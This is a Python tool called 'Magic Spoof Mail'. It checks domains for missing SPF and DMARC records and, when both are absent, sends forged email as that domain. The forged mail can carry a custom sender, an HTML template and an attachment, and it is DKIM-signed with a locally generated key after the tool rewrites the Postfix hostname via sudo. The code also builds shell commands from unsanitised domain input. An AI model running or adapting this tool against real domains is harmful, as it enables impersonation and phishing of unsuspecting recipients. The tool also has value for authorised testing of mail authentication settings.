""" coding: utf-8 """

# Import libraries
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import argparse
import dkim
import os
import pydig
import smtplib
import sys


# @name: checkargs()
# @description: Check the arguments passed during callback
# @return: array
def checkargs():
    """ Check the arguments passed during callback """
    parser = argparse.ArgumentParser(description='Magic Spoof Mail 1.0')
    parser.add_argument('-f', "--file",
                        action="store",
                        dest='file',
                        help="File with a list of domains to check.")
    parser.add_argument('-d', "--domain",
                        action="store",
                        dest='domain',
                        help="Single domain to check.")
    parser.add_argument('-c', "--common",
                        action="store_true",
                        dest='common',
                        help="Common TLD")
    parser.add_argument('-t', "--test",
                        action="store_true",
                        dest='test',
                        help="Send an email test")
    parser.add_argument('-e', "--email",
                        action="store",
                        dest='email',
                        help="Send an email to this receiver address in order to test the spoofing mail from address.")
    parser.add_argument('-s', "--smtp",
                        action="store",
                        dest='smtp',
                        help="Use custom SMTP server to send a test email. By default: 127.0.0.1")
    parser.add_argument('-a', "--attachment",
                        action="store",
                        dest='attachment',
                        help="Path to the file to attach with email")
    parser.add_argument("--subject",
                        action="store",
                        dest='subject',
                        help="Subject of the email message")
    parser.add_argument("--template",
                        action="store",
                        dest='template',
                        help="HTML template for body message")
    parser.add_argument("--sender",
                        action="store",
                        dest='sender',
                        help="Sender email by default <test@domain.tld>")
    queries = parser.parse_args()
    if (len(sys.argv) == 1) or (queries.file is False and queries.domain is False):
        parser.print_help(sys.stderr)
        sys.exit(1)
    return queries


# @name: checkspf()
# @description: Check domain SPF configuration
# @return: array
def checkspf(domain):
    """ Check domain SPF configuration """
    load_spf = pydig.query(domain, 'TXT')
    bool_spf = 0
    for line in load_spf:
        if "spf" in line:
            bool_spf = 1
            print("[+] SPF is present")
            break
    if bool_spf == 0:
        print("[-] This domain hasn't SPF config yet")
    return bool_spf


# @name: checkdmarc()
# @description: Check domain Dmarc configuration
# @return: array
def checkdmarc(domain):
    """ Check domain Dmarc configuration """
    load_dmarc = pydig.query('_dmarc.' + domain, 'TXT')
    bool_dmarc = 0
    for line in load_dmarc:
        if "p=none" in line:
            bool_dmarc = 1
            print("[+] DMARC is present but wrong configured")
            print("[+] DMARC policy is configured in p=none")
            break
        elif "DMARC" in line:
            bool_dmarc = 2
            print("[+]  DMARC is present")
            break
    if bool_dmarc == 0:
        print("[-] Domain hasn't DMARC register")
    return bool_dmarc


# @name: checkdomain()
# @description: Check domain configuration
# @return: array
def checkdomain(domain2process):
    """ Check domain configuration """
    startheader(domain2process)
    flag_spf = checkspf(domain2process)
    flag_dmarc = checkdmarc(domain2process)
    if flag_spf == 0 and flag_dmarc == 0:
        print("[!] You can spoof this domain!")
        if args.test and args.email:
            smtp = args.smtp if args.smtp else "127.0.0.1"
            sendspoof(domain2process, args.email, smtp)
    print(" ")


# @name: postfixbackup()
# @description: Backup Postfix configuration
# @return: array
def postfixbackup():
    """ Backup Postfix configuration """
    os.system("sudo cp /etc/postfix/main.cf /etc/postfix/main.cf.backup")


# @name: postfixrestore()
# @description: Restore Postfix config
# @return: array
def postfixrestore():
    """ Restore Postfix configuration """
    os.system("sudo mv /etc/postfix/main.cf.backup /etc/postfix/main.cf")
    os.system("sudo systemctl reload postfix")


# @name: sendspoof()
# @description: Send email using spoofed domain
# @return: array
def sendspoof(domain, destination, smtpserv, dkim_privkey_path="dkimprivatekey.pem", dkim_selector="s1"):
    """ Send email using spoofed domain """
    if args.smtp is None:
        postfixbackup()
        os.system("sudo sed -ri 's/(myhostname) = (.*)/\\1 = " + domain + "/g' /etc/postfix/main.cf")
        os.system("systemctl restart postfix")

    sender = args.sender if args.sender else "test@" + domain
    subject = args.subject if args.subject else "Test message"

    message_text = "Test message"
    if args.template:
        with open(args.template, "r") as fileopen:
            message_html = fileopen.read()
    else:
        message_html = "<html><body><h3>Test</h3><br/><p>Test magicspoofing</p></body></html>"

    os.system("rm -rf dkimprivatekey.pem public.pem 2> /dev/null")
    os.system("openssl genrsa -out dkimprivatekey.pem 1024 2> /dev/null")
    os.system("openssl rsa -in dkimprivatekey.pem -out public.pem -pubout 2> /dev/null")

    sdomain = sender.split("@")[-1]
    msg = MIMEMultipart("alternative")
    msg.attach(MIMEText(message_text, "plain"))
    msg.attach(MIMEText(message_html, "html"))

    msg["To"] = destination
    msg["From"] = sender
    msg["Subject"] = subject
    if args.attachment:
        attachfile = args.attachment
        with open(attachfile, 'rb') as attach_file:
            payload = MIMEBase('application', 'octate-stream')
            payload.set_payload(attach_file.read())
        encoders.encode_base64(payload)
        payload.add_header('content-disposition', 'attachment', filename=attachfile)
        msg.attach(payload)

    try:
        msg_data = msg.as_bytes()
    except ImportError:
        msg_data = msg.as_string()

    if dkim_privkey_path and dkim_selector:
        with open(dkim_privkey_path) as fh:
            dkimprivkey = fh.read()
        headers = [b"To", b"From", b"Subject"]
        sig = dkim.sign(message=msg_data, selector=str(dkim_selector).encode(), domain=sdomain.encode(),
                        privkey=dkimprivkey.encode(), include_headers=headers)
        msg["DKIM-Signature"] = sig[len("DKIM-Signature: "):].decode()

        try:
            msg_data = msg.as_bytes()
        except ImportError:
            msg_data = msg.as_string()

    s = smtplib.SMTP(smtpserv)
    s.sendmail(sender, [destination], msg_data)
    s.quit()

    print("[+] Email sent successfully as " + sender)
    os.system("rm -rf dkimprivatekey.pem public.pem 2> /dev/null")

    if args.smtp is None:
        postfixrestore()
    return msg


# @name: startheader()
# @description: Start the header
# @return: array
def startheader(domain):
    """ Start the header """
    print("---------------------------- Analyzing " + domain + " ----------------------------")


# Callback
if __name__ == "__main__":
    args = checkargs()
    if args.domain:
        if args.common:
            tlds = ['es', 'com', 'fr', 'it', 'co.uk', 'cat', 'de', 'be', 'au', 'xyz']
            entry = args.domain.find(".")
            if entry != -1:
                for tld in tlds:
                    domainonly = args.domain[:entry]
                    domainwtld = domainonly + "." + tld
                    checkdomain(domainwtld)
            else:
                for tld in tlds:
                    domainwtld = args.domain + "." + tld
                    checkdomain(domainwtld)
        else:
            checkdomain(args.domain)

    if args.file:
        with open(args.file, "r") as file:
            for domain_line in file:
                domain_line = domain_line.strip()
                checkdomain(domain_line)
